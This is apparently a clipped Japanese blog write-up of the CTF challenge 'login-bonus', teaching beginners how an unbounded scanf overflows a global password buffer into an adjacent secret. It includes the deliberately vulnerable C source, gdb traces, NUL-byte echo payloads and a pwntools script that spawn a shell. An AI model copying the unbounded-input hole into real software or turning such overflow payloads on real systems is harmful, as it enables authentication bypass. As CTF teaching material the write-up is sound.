---
title: login-bonus (Daily AlpacaHack 2025/12/17) 公式Writeup - CTFするぞ
source: https://ptr-yudai.hatenablog.com/entry/2025/12/18/151253
source_host: ptr-yudai.hatenablog.com
clip_date: 2026-09-24T10:40:24+08:00
trace_id: 2d116bdc-0d54-420a-a27d-dab787f509e3
content_hash: ed48c363393d82415cf5369e6657530bffda51b9819bbaa9755a0a55baf873ee
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: ptr-yudai·内核利用
ai_summary: 用 scanf 的无长度限制输入造成缓冲区溢出，覆写相邻全局变量 secret 即可绕过口令校验并触发 `system("/bin/sh")`。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3e575244-d011-811b-bfa9-c70bfe185c1f
ioc:
  cves: []
  cwes: []
  hashes:
    - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 用 scanf 的无长度限制输入造成缓冲区溢出，覆写相邻全局变量 secret 即可绕过口令校验并触发 `system("/bin/sh")`。
> 
> - **漏洞根因：** `scanf("%[^\n]", password)` 无长度限制，而全局 `char password[32]` 与 `char secret[32]` 在内存中相邻，超出 32 字节的输入会直接覆盖 secret。
> - **利用构造：** scanf 会接受 NUL 字节，故发 `test\x00` + 27 个填充字符 + `test`，使 password 与 secret 同为 "test"；也可直接发一长串 `\0` 让两者都成空串。
> - **调试验证：** gdb 中 `break main` / `break strcmp`，用 `x/8xg &password` 与 `x/1s &secret` 确认溢出字节数与 C 字符串以 NUL 截断的特性。
> - **拿 shell 后：** 管道会耗尽 stdin，需用 `(echo -e "payload"; cat) | ./login` 或把待执行命令一并 echo 进管道。
> - **自动化：** pwntools 用 `sendlineafter(b'Password: ', payload)` 加 `interactive()` 实现交互式利用。

## はじめに

この記事では、私が2025年12月17日の [Daily AlpacaHack](https://alpacahack.com/daily) で出題した login-bonus の解説をします。プログラミングは少しできるあるいは [Linux](https://d.hatena.ne.jp/keyword/Linux) は少し触れるけどCTFには参加したことがない、くらいの層を想定して書いています。

問題を先に解きたい方は [こちら](https://alpacahack.com/daily/challenges/login-bonus) からどうぞ。

## 問題概要

以下の5つのファイルが渡されます。

```
$ ls
compose.yaml  Dockerfile  flag.txt  login  login.c
```

基本的にpwnの問題では、サーバ側で動作しているプログラムに [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD) があり、それを悪用することで不正な動作を起こしたり、サーバ側で任意コード実行したりすることを目的とします。そのため、配布ファイルにはほぼ必ずサーバ側で動作しているプログラム本体があり、場合によっては [ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9) も与えられます。

fileコマンド等で確認すると、今回は `login` という名前のファイルが実行可能ファイルであることがわかります。（ELFとは、 [Linux](https://d.hatena.ne.jp/keyword/Linux) で使われる実行可能ファイルの形式名です。）そして、 `login.c` はその [ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9) にあたります。

```
$ file login
login: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

CTFにおいては多くの場合、サーバ側で [dockerコンテナ](https://www.docker.com/ja-jp/) 上でプログラムが動作しています。これはpwnに限らず、webやcryptoでもdockerが使われることが多いです。理由は環境のデプロイが簡単なのと、 [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD) を使って危険な操作をできてしまうという性質上、ホストマシンと分離する必要があるからです。

今回の問題でも配布されている `Dockerfile` や `compose.yaml` は、このdockerコンテナを起動するためのファイルになります。問題を解く際に必ずしも使う必要はありませんが、サーバ側で実際に動作している状況を正確に再現し、手元のマシンで攻撃コードを試すために利用できます。

簡単な問題の場合、環境に依存せず解けることが多いです。その場合は、次のように単純に手元でプログラムを起動して動作を確認しても問題ありません。

```
$ ./login
```

Dockerコンテナを立ち上げて試したい場合は、次のようなコマンドを使います。Dockerのインストールは [こちら](https://docs.docker.com/engine/install/) を参照ください。

```bash
$ docker compose up --build
あるいは
$ sudo docker compose up --build
```

コンテナのビルドと起動が完了すると、dockerコンテナが立ち上がります。

```bash
$ docker ps
CONTAINER ID   IMAGE                     COMMAND              CREATED          STATUS          PORTS                                         NAMES
0953281143fe   login-bonus-login-bonus   "xinetd -dontfork"   20 seconds ago   Up 19 seconds   0.0.0.0:9999->9999/tcp, [::]:9999->9999/tcp   login-bonus-login-bonus-1
```

この例ではコンテナ内部の9999番ポート（ `9999/tcp` ）が、ホストマシンの9999番ポート（ `0.0.0.0:9999` ）にバインドされて見える状態になっています。

開放されたポートには通常socketを利用して接続する必要がありますが、毎回プログラムを書いていると面倒です。そこで、接続テストには [netcat (nc)](https://ja.wikipedia.org/wiki/Netcat) と呼ばれるプログラムを利用するのが一般的です。 [Ubuntu](https://d.hatena.ne.jp/keyword/Ubuntu) の場合は `apt install netcat` などでインストールできます。

接続すると、以下のようにサーバ（dockerコンテナ内で動作しているプログラム）からの応答があり、こちらからも入力を送信できます。

```
$ nc 0.0.0.0 9999
[DEBUG] Generating secure password...
Password: test # こちらからの入力
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'test' != 'FUHPXMUOBWLBLDVK'
```

本番のサーバに攻撃する場合は、問題文で提示された [IPアドレス](https://d.hatena.ne.jp/keyword/IP%A5%A2%A5%C9%A5%EC%A5%B9) に対してncで接続します。

接続した結果を見ると、どうやらパスワードを聞かれているようですが、適当に入力してもログインできません。 最後に正しいパスワードと思われる文字列が表示されますが、この部分は毎回ランダムに作られるため、現状ではパスワードがわかりません。

## 解説

問題を解くまでの流れを解説します。

## ソースコードの読解

さて、今回は [C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) の [ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9) が配布されているので、これを読んでみましょう。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>

#define debug_report(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

char password[32];
char secret[32];

int main() {
  /* Input password */
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  debug_report("Authenticating...");
  if (strcmp(password, secret)) {
    puts("[-] Wrong password");
    debug_report("'%s' != '%s'", password, secret);
    
  } else {
    puts("[+] Success!");
    system("/bin/sh");
  }

  return 0;
}

__attribute__((constructor))
void setup() {
  int seed;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Generate random password */
  debug_report("Generating secure password...");
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < 16; i++)
    secret[i] = 'A' + (rand() % 26);
}
```

このプログラムでは `main` と `setup` という関数、 `password` と `secret` という [グローバル変数](https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4) 、さらに `debug_report` というマクロが定義されており、なにやらゴチャゴチャしています。ひとつずつ読んでいきましょう。

[C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) は `main` 関数から始まるので、 `main` 関数の中身を読んでみましょう。まず、最初に `printf` で「Password: 」と出力して、変数 `password` に `scanf` で入力を受け付けます。

```c
/* Input password */
printf("Password: ");
scanf("%[^\n]", password);
```

`scanf` は書式文字列という文字列を第一引数に受け取り、入力されたデータをそれに従って変数に格納します。今回の書式文字列は「%\[^\\n\]」で、少し馴染みのないものになっていますが、「改行（\\n）以外（^）で構成される文字列を受け取る」という意味になります。 したがって、我々が入力した文字列（パスワード）が変数 `password` に格納されることになります。

続いて、パスワードの比較があります。 `debug_report` マクロは、内部的には `printf` を呼び出しているだけで、 [デバッグ](https://d.hatena.ne.jp/keyword/%A5%C7%A5%D0%A5%C3%A5%B0) メッセージを表示するために使われています。

```c
/* Check password */
debug_report("Authenticating...");
if (strcmp(password, secret)) {
  puts("[-] Wrong password");
  debug_report("'%s' != '%s'", password, secret);
    
} else {
  puts("[+] Success!");
  system("/bin/sh");
}
```

`strcmp` 関数を使って `password` と `secret` （後述しますが、ここに正しいパスワードがある。）の文字列を比較しています。 `strcmp` 関数を検索すると、2つの文字列が一致した場合に0を返すことがわかります。したがって、 `if` 文のtrueのブロックはパスワードが間違っているとき、falseのブロックはパスワードが正しいときの処理を表します。 間違っているときは「Wrong password」と表示し、さらに入力したパスワードと正しいパスワードを `debug_report` で出力します。 正しいときは「Success!」と表示し、 `system("/bin/sh")` を呼び出します。

ここで、 `system` 関数は第一引数のコマンドを実行する関数です。また、 `/bin/sh` はシェルと呼ばれる、どのようなコマンドでも実行できるインタフェースにあたります。 したがって、この問題ではパスワードが一致して、 `/bin/sh` を起動することができれば、サーバ側で自由な操作をできるようになります。

このように、CTFのpwn問題では多くの場合、何かしらの方法で `/bin/sh` を起動させることが最終的な目標になります。

さて、パスワード文字列を比較している `secret` という変数ですが、これは `setup` 関数で初期化されています。 `setup` 関数はどこからも呼び出されていませんが、 `__attribute__((constructor))` という属性が付けられています。これはプログラムが起動して `main` 関数が始まるよりも前に呼び出したい関数に付けられる属性です。したがって、 `setup` 関数は `main` 関数よりも先に実行されます。

```c
int seed;
setbuf(stdin, NULL);
setbuf(stdout, NULL);

/* Generate random password */
debug_report("Generating secure password...");
getrandom(&seed, sizeof(seed), 0);
srand(seed);
for (size_t i = 0; i < 16; i++)
  secret[i] = 'A' + (rand() % 26);
```

この関数では、まず `setbuf` 関数を2回呼び出しています。これは標準入出力のバッファリングを無効化するためのコードで、これがないと例えば `printf` の出力結果がバッファリングされ、ネットワーク越しだと出力されない、といった問題が起こる場合があります。バッファリングの問題を防ぐために、CTFのプログラムでは最初に `setbuf` が呼び出されることがしばしばあります。CTFを始めたうちは、おまじないだと思って問題ありません。

次に、 `getrandom` 関数で十分に安全なシード値を作ったあと、 `srand` と `rand` 関数（乱数生成）を使って `secret` 文字列を構築します。 [C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) において、文字の表現は [ASCIIコード](https://ja.wikipedia.org/wiki/ASCII) に従って決められています。例えば'A'という文字は0x41（10進数で65）が割り当てられています。

'A'〜'Z'までのアルファベットは連番です。したがって、 `'A' + (rand() % 26)` のコードは'A'から'Z'までのランダムなアルファベット1文字を作るコードです。これを `for` 文で16回繰り返しているので、全体としてランダムな16文字のアルファベット（大文字）の文字列が生成されます。

ここまでで [ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9) のすべてを読みました。ランダムなパスワード `secret` を生成し、ユーザが `password` にパスワードを入力し、一致していればシェルが起動し、一致していなければ正しいパスワードを [デバッグ](https://d.hatena.ne.jp/keyword/%A5%C7%A5%D0%A5%C3%A5%B0) 出力するだけ、という動作がわかりました。 netcatで実際につないでみた結果の動作とも一致していることが確認できます。

```
$ nc 0.0.0.0 9999
[DEBUG] Generating secure password...
Password: test
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'test' != 'YPDFHOGMWPEWCYUI'
```

## 脆弱性の調査

この問題を攻略するためにまず考えてみたいのは、正しいパスワード `secret` の内容を当てる方針です。 パスワードが間違っていたときに正しいパスワードが `debug_report` で出力されていますが、これは認証後のコードですし、毎回パスワードは変わるので使えなさそうです。

```c
puts("[-] Wrong password");
debug_report("'%s' != '%s'", password, secret);
```

次にパスワードの生成方法が安全かを考えてみます。今回はランダムなアルファベット16文字を生成していました。

```c
getrandom(&seed, sizeof(seed), 0);
srand(seed);
for (size_t i = 0; i < 16; i++)
  secret[i] = 'A' + (rand() % 26);
```

可能な組み合わせはアルファベット26種類の組み合わせを16文字なので、 26 16 = 43608742899428874059776 通りあり、総当りは現実的ではありません [\*1](#f-4f2652af "CTFでは総当りは好ましくありません。著者の思想では、ネットワーク経由の場合は最大4096回程度の試行で解けることが望ましく、最悪の場合でも1/65536くらいの確率で解けないとDoS判定されると考えています。") 。 また、乱数シードは `getrandom` で生成していますが、これは [Linux](https://d.hatena.ne.jp/keyword/Linux) 側が生成する安全な乱数（ `/dev/urandom` 相当）を利用しており、比較的安全であると言えます。

では、パスワードを当てる以外の方法はあるでしょうか。

pwn問題やCTFに限らず、 [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD) を見つけるときの考え方の1つとして、入力箇所を疑うことが挙げられます。 本来動作しているはずのプログラムで異常が起きるということは、何かしら外部からの入力が予期しない値になっている可能性が高いです。したがって、我々が入力を与えられる箇所、あるいは入力値を元に作られた変数の流れを追っていくことで、 [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD) にたどり着けることがあります。

今回の入力箇所はパスワード入力の1箇所のみなので、そこに着目してみましょう。入力箇所は `main` 関数内の `scanf` です。

```c
scanf("%[^\n]", password);
```

先ほども説明したとおり、この書式文字列は改行以外の文字列を `password` へ入力します。 この書式指定子には入力長の制限がないため、非常に危険です。一方で、 `password` は最大32文字だけ入れられる文字列変数として定義されています。

```c
char password[32];
```

このように、変数のサイズ（容量; capacity）を超えて値を入れられてしまう問題を **[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)** と呼びます。今回の問題は、この [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) を利用して解くことができます。

では、32文字を超えて入力すると何が起きるのでしょうか。実際に試してみましょう。 適当に"A"を32文字以上入力してみます。すると、やはりパスワードチェックは失敗しますが、最後の出力に注目してください。

```
$ ./login
[DEBUG] Generating secure password...
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' != 'AAAAAAAA'
```

本来はランダムに作られたパスワード `secret` が出力されるはずですが、”A”が何文字か出力されました。何が起こっているのでしょうか。

## gdbによる検証

何が起きているかを確認するため、プログラムを動作させながらその処理を追っていきます。この目的でpwnでは頻繁に [gdb](https://d.hatena.ne.jp/keyword/gdb) というデバッガを利用します。 [gdb](https://d.hatena.ne.jp/keyword/gdb) は [Ubuntu](https://d.hatena.ne.jp/keyword/Ubuntu) の場合以下のコマンドでインストールできます。

```
$ sudo apt install gdb
```

[gdb](https://d.hatena.ne.jp/keyword/gdb) でプログラムを起動するには、次のように引数としてファイルパスを渡します。 `--` は「これ以降は [gdb](https://d.hatena.ne.jp/keyword/gdb) ではなく `./login` の引数として解釈してね」という意味で、今回は引数がいらないのでなくても構いません。

```
$ gdb -- ./login
```

起動すると `(gdb)` というプロンプトが表示されると思います。（ [拡張機能](https://d.hatena.ne.jp/keyword/%B3%C8%C4%A5%B5%A1%C7%BD) を入れている人は `gef>` や `pwndbg>` といったプロンプトになります。）

```
...
Reading symbols from ./login...
(No debugging symbols found in ./login)
(gdb) 
```

まず、 `main` 関数に入る直前の状態を確認してみましょう。プログラムをどこかで一時停止させたい場合は、 `break` コマンドで [ブレークポイント](https://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8) を設定します。

```
(gdb) break main
Breakpoint 1 at 0x11bd
```

これで [ブレークポイント](https://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8) を設置できました。 `run` コマンドでプログラムを初回起動できます。（「Enable debuginfod for this session?」と聞かれた場合はEnterでスキップして構いません。） すると、プログラムが開始して `main` 関数が実行されようとするため、 [ブレークポイント](https://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8) にヒットしてプログラムが停止します。

```
(gdb) run
...
[DEBUG] Generating secure password...

Breakpoint 1, 0x00005555555551bd in main ()
```

`password` や `secret` は [グローバル変数](https://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D0%A5%EB%CA%D1%BF%F4) として定義されているため、その中身を見てみましょう。 `x` コマンドでメモリの中身を確認できます。このとき `x/8xg` のように書くと、メモリの内容を64-bitごとに（g）16進数で（x）8ブロック分（8）表示できます。

左側の数字（0x555555558040など）がメモリ上でその値が入っているアドレスで、右側の数値が実際に入っている値です。

```
(gdb) x/8xg &password
0x555555558040 <password>:      0x0000000000000000      0x0000000000000000
0x555555558050 <password+16>:   0x0000000000000000      0x0000000000000000
0x555555558060 <secret>:        0x59494d4f51454b4d      0x4a4c564359595451
0x555555558070 <secret+16>:     0x0000000000000000      0x0000000000000000
```

`password` の直後に `secret` があることがわかります。今回 `char password[32]` と定義していたため、 `password` には少なくとも32バイト（0x20バイト）の容量があるはずです。実際にアドレスは0x5555...8040から0x5555...8060までの0x20バイトを `password` が専有しているため、プログラムどおりであることがわかります。

`setup` 関数は `main` 関数より先に終わっているため、 `secret` の初期化は完了しており、正しいパスワードが設定されていることが確認できます。 `x/1s` とすると、文字列として（s）1ブロック分（1）表示できます。

```
(gdb) x/1s &secret
0x555555558060 <secret>:        "MKEQOMIYQTYYCVLJ"
```

確かに今回のプログラムが作ったパスワードらしきものが入っています。

続いて、プログラムを続行して"A"を40文字ほど入力してみましょう。続行するには `c` や `continue` コマンドを使います。 単純に続行してしまうとそのままプログラムが終了してしまうので、パスワードを比較している `strcmp` 関数あたりに [ブレークポイント](https://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8) を付けてから続行します。 パスワードを入力すると、パスワード比較の `strcmp` 関数の [ブレークポイント](https://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8) にヒットしてプログラムが停止します。

```bash
(gdb) break strcmp
Breakpoint 2 at 0x7ffff7d8afd0: strcmp. (2 locations)
(gdb) continue 
Continuing.
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Authenticating...

Breakpoint 2.1, __strcmp_avx2 () at ../sysdeps/x86_64/multiarch/strcmp-avx2.S:206
warning: 206    ../sysdeps/x86_64/multiarch/strcmp-avx2.S: No such file or directory
```

このときの `password` と `secret` を確認してみましょう。

```
(gdb) x/8xg &password
0x555555558040 <password>:      0x4141414141414141      0x4141414141414141
0x555555558050 <password+16>:   0x4141414141414141      0x4141414141414141
0x555555558060 <secret>:        0x4141414141414141      0x4a4c564359595400
0x555555558070 <secret+16>:     0x0000000000000000      0x0000000000000000
```

入力した値が `password` に入っています。ここで、 `secret` の先頭も書き換わっていることに注目してください。

`password` には32バイトの容量しかないにも関わらず、 `scanf` を通して40バイト入力してしまったため、 `password` のうしろに8バイトだけ [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) を引き起こしてしまっています。 その結果、 `secret` の中身が少し書き換わってしまっています。

実際に文字列として確認すると、 `secret` が "AAAAAAAA" になってしまっています。

```
(gdb) x/1s &password
0x555555558040 <password>:      'A' <repeats 40 times>
(gdb) x/1s &secret
0x555555558060 <secret>:        "AAAAAAAA"
```

このように、 [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) が発生すると、隣接するデータを破壊してしまい、結果としてプログラムが予期しない動作を引き起こします。

図で表すと次のようになっています。まず、 `password` への入力前のメモリはこのような状態になっています。空の部分はNULLバイト（0x00）が入っています。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f09e1e32dc5c409b.png)

40文字を入力して [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) を引き起こすと、次のように `secret` の一部を破壊してしまいます。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c931ecea67928050.png)

ここで、もう1つ注目したいのは `secret` の長さも変化していることです。本来 `secret` はランダムな16バイトのアルファベットでしたが、 [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) 後は8文字になっています。

これは、 [C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) では「NULLバイト (0x00) が現れるまでをその文字列の長さとする」と定義されているためです。これをC stringなどと呼びます。 つまり、 `scanf` で文字列を入力すると必ず終端に 0x00 が付加されます。実際に、 `secret+8` のアドレスには0x00が入っていることが確認できます。

```
(gdb) x/16xb &secret
0x555555558060 <secret>:        0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x555555558068 <secret+8>:      0x00    0x54    0x59    0x59    0x43    0x56    0x4c    0x4a
```

この特徴は今回の問題を解く上で非常に重要になります。

## 解いてみる

ここまでの検証の結果から、「 `secret` を当てる」のではなく「 `secret` を書き換える」ことで認証を突破するという方針が立ちました。

ただし、先ほどの例のように適当に入力してオーバーフローを引き起こしても、 `password` と `secret` は別の長さの文字列になってしまうため、常にパスワード比較は失敗します。 そこで、 [C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) の文字列がNULL終端であるという特徴を利用して、 `password` 側の文字列長を短くすることを考えます。

`scanf` の `%s` や `%[^\n]` といった文字列入力では、実はNULLバイトも入力することができます。（これはキーボードから直接入力できるという意味ではなく、標準入力にバイナリデータとして流し込めば受理される、という意味です。） [C言語](https://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC) の文字列がNULL終端という事実と反するため非直感的ですが、 `scanf` に限らず `fgets`, `getline` などの関数はすべてNULL文字を受理してくれます。

したがって、 `password` の途中にNULL文字を入れれば、 `password` の文字列長を短くした状態で [バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC) を引き起こすことができます。

NULL文字はキーボードから入力できないので、echoやprintfなどで作って、それをパイプでプログラムの標準入力に渡してやる必要があります。 例えば0x41（A）をプログラムの入力に与えたければ、次のように `\x??` 形式で書けます。（通常の文字と混合できます。）

```
$ echo -e "\x41BC" | ./login 
[DEBUG] Generating secure password...
Password: [DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'ABC' != 'CBDGWYNTJMXEOFRU'
```

パスワードを"test"にしたい場合、"test"の後にNULL文字を入れて、さらに32-4-1=27文字適当な文字列を入れて `password` の領域を埋め、最後に"test"を付加すれば `password` と `secret` が"test"に書き換わります。 試してみましょう。

```
$ echo -e "test\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAtest" | ./login 
[DEBUG] Generating secure password...
Password: [DEBUG] Authenticating...
[+] Success!
```

正しい入力を与えられていると、「Success!」と表示されます！これでシェルが起動したはずです。

ちなみに、もう少し簡単な方法として、大量のNULL文字を送る方法があります。そうすれば `password` も `secret` も0x00になるため、空文字列ど [うしの](https://d.hatena.ne.jp/keyword/%A4%A6%A4%B7%A4%CE) 比較で一致して認証を突破できます。

```swift
# \x00の代わりに\0という書き方もOK
$ echo -e "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" | ./login 
[DEBUG] Generating secure password...
Password: [DEBUG] Authenticating...
[+] Success!
```

## 最後の難関：消えた標準入力

「Success!」と表示されたのは良いですが、シェルは起動せず終了してしまいました。なぜでしょうか。

今回パイプを使ってパスワードを入力しました。パイプとは、そもそも前のコマンドの標準出力を次のコマンドの標準入力に繋ぐ機能です。シェルも標準入力からコマンドを受け取ろうとするのですが、前のコマンドの標準出力にコマンドはないため、何も入力できず失敗します。

解決策はいくつかあります。ひとつは、シェルに入力したい文字列もechoで出力しておく方法です。例えば `date` コマンドを実行したい場合、次のように入力を送って改行（ `scanf` を完了させる）したあとに"date"という文字列が来るようにすれば、シェルにコマンドを渡せます。

```
$ echo -e "test\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAtest\ndate" | ./login 
[DEBUG] Generating secure password...
Password: [DEBUG] Authenticating...
[+] Success!
Wed Dec 17 11:41:54 PM JST 2025
```

他にも、標準入力をそのまま標準出力に流してくれるプログラムがあれば、echoに出力させた後にそれを実行することで、標準入力をパイプ経由で流すことができます。少し技巧的ですが、catコマンドが利用できます。

```
$ (echo -e "test\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAtest"; cat) | ./login
[DEBUG] Generating secure password...
Password: [DEBUG] Authenticating...
[+] Success!
date
Wed Dec 17 11:44:40 PM JST 2025
```

今回はローカルで `login` プログラムを実行しましたが、netcatにパイプをつないでも同様の結果が得られます。

フラグを取得するコマンドはぜひ皆さん自身で試してみてください。

## おまけ：pwntoolsの導入

今回のプログラムはこちらから一方的にデータを入力しましたが、場合によってはプログラムからの出力（応答）が重要になってくる場合があります。 このような場合、 `echo` とパイプで解こうとしても結果に応じて何かすることができないため困ります。

CTFのpwnでは、一般的に [pwntools](https://github.com/Gallopsled/pwntools) という [Python](https://d.hatena.ne.jp/keyword/Python) のライブラリが利用されます。pipが入っている人は `pip install pwntools` でインストールできます。 このライブラリを使うと、今回の問題の解法は次のように記述できます。

```python
from pwn import process, remote

io = process('./login') # loginプログラムを起動
# io = remote('ip', port) # リモートサーバの場合

payload  = b'test'   # password
payload += b'\x00'   # NULL終端
payload += b'A' * 27 # 32文字分埋める
payload += b'test'   # secret
# "Password: "という文字列を受信したら、payloadを改行込みで送る
io.sendlineafter(b'Password: ', payload)

io.interactive() # 標準入出力に切り替え
```

実行結果：

```
$ python test.py 
[+] Starting local process './login': pid 19002
[*] Switching to interactive mode
[DEBUG] Authenticating...
[+] Success!
$ date
Wed Dec 17 11:51:56 PM JST 2025
$
```

プログラムとの通信を直感的に記述できる上、pwnでよく使う機能も標準搭載しています。 難易度の高いpwn問題に挑戦してみたい方は、ぜひインストールして使ってみてください。

## まとめ

pwnはCTFの分野の中でも難しいイメージがあり敬遠されがちだと思います。 しかし、 [ソースコード](https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9) を読んだりデバッガでプログラムを追ったりして少しずつ処理を紐解いていくと、徐々に道が開けてくる面白い分野でもあります。 また、pwnの勉強をすることで付随して [システムプロ](https://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%D7%A5%ED) グラミングやコンピュータ [アーキテクチャ](https://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3) の深い知識を得ることができる実用的な分野ですので、ぜひ挑戦してみてください！

[\*1](#fn-4f2652af):CTFでは総当りは好ましくありません。著者の思想では、ネットワーク経由の場合は最大4096回程度の試行で解けることが望ましく、最悪の場合でも1/65536くらいの確率で解けないと [DoS](https://d.hatena.ne.jp/keyword/DoS) 判定されると考えています。
